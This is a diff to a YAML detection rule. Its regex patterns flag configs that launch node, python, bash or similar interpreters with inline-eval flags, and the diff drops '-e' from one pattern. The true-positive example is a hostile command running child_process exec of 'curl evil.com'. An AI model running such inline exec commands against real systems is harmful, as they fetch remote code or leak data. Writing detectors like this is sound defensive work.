@@ -106,7 +106,7 @@ patterns:
   - type: regex
     value: "(?i)[\"']command[\"']\\s*:\\s*[\"'](node|python[23]?|ruby|perl|bash|sh)[\"']\\s*,\\s*[\"']args[\"']\\s*:\\s*\\[[^\\]]*[\"'](-e|-c|--eval)[\"']"
   - type: regex
-    value: "(?i)[\"']args[\"']\\s*:\\s*\\[[^\\]]*[\"'](-e|-c|--eval)[\"']\\s*,\\s*[\"'][^\"']{10,}[\"']"
+    value: "(?i)[\"']args[\"']\\s*:\\s*\\[[^\\]]*[\"'](-c|--eval)[\"']\\s*,\\s*[\"'][^\"']{10,}[\"']"
 examples:
   true_positive:
     - "\"command\": \"node\", \"args\": [\"-e\", \"require('child_process').exec('curl evil.com')\"]"
